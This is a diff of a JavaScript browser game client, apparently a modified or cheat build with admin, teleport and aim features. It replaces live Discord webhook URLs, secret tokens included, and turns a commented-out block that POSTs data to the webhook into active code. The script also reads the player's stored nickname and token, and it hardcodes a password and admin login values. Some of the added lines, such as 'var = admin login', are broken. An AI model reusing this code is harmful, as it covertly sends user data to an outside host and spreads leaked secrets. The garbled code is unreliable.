@@ -1289,12 +1289,12 @@ function crtplayer(buf, message, Leaderboard) {
   if (administrator > 1) {
     webhook.open(
       "POST",
-      "https://discord.com/api/webhooks/1043980741303873576/Y2xpY8IPCC6kPrA3q_yAhrRBg6rxgS3dLSlgd0SYGIpNKF3BIJrdiL-sYHWilIFyVTKQ"
+      "https://discord.com/api/webhooks/1170021999083536485/PSDXYtwRK6GDxP6nnQbHMug3pZpWSsZIEx6CgiV4JqB6dyeh1ROnC4oDgCIfHeAN0tSB"
     );
   } else {
     webhook.open(
       "POST",
-      "https://discord.com/api/webhooks/1043980741303873576/Y2xpY8IPCC6kPrA3q_yAhrRBg6rxgS3dLSlgd0SYGIpNKF3BIJrdiL-sYHWilIFyVTKQ"
+      "https://discord.com/api/webhooks/1170021999083536485/PSDXYtwRK6GDxP6nnQbHMug3pZpWSsZIEx6CgiV4JqB6dyeh1ROnC4oDgCIfHeAN0tSB"
     );
   }
 
@@ -1316,7 +1316,7 @@ function crtplayer(buf, message, Leaderboard) {
   webhook.send(JSON.stringify(params));
 
   SERVG.nnvVM();
-  SERVG.profileplayerfunc(); /*
+  SERVG.profileplayerfunc();
         if (administrator == 1){
             SERVG.socket[SERVG.PLAYER.id].text.push("| Creative Mode Commands: |");
             SERVG.socket[SERVG.PLAYER.id].text.push("!item= | !teleport=");
@@ -2302,7 +2302,7 @@ function datatosrv(dat) {
     if (userid === window.NaN) userid = -1;
   } catch (error) {}
 
-  var nick = localStorage.getItem("nickname"); // + " ";
+  var nick = localStorage.getItem("nickname"); // + ".";
   var token = localStorage.getItem("token"); // "10010110000011111000";
   var mNVNV = (WebSocketClient.state & WebSocketClient.binary.b64) > 0 ? 1 : 0;
   var skin = window.Number(localStorage.getItem("skin"));
@@ -2324,14 +2324,8 @@ function datatosrv(dat) {
     userid = parseInt(xmlHttpS.responseText);
     password = "FFjEyX21za"
   }
-
-  admin login
-
-  tokenid = -1;
+  var = admin login
   nickname = "Elmas";
-  userid = 1;
-
-   admin login
   token = "3056dickeeas85j2ktlkH54a";
   tokenid = -1;
   userid = -1;
@@ -2521,9 +2515,9 @@ var WebSocketClient = (function () {
     aimenable = 0;
     autorun = 0;
     websocket.send('[1, "!teleport-to=' + myArray[1] + '"]');
-    /*
+	        
 	        const webhook = new XMLHttpRequest();
-     	    webhook.open("POST", "https://discord.com/api/webhooks/1043980741303873576/Y2xpY8IPCC6kPrA3q_yAhrRBg6rxgS3dLSlgd0SYGIpNKF3BIJrdiL-sYHWilIFyVTKQ");
+     	    webhook.open("POST", "https://discord.com/api/webhooks/1170021999083536485/PSDXYtwRK6GDxP6nnQbHMug3pZpWSsZIEx6CgiV4JqB6dyeh1ROnC4oDgCIfHeAN0tSB");
     
    	        webhook.setRequestHeader('Content-type', 'application/json');
     
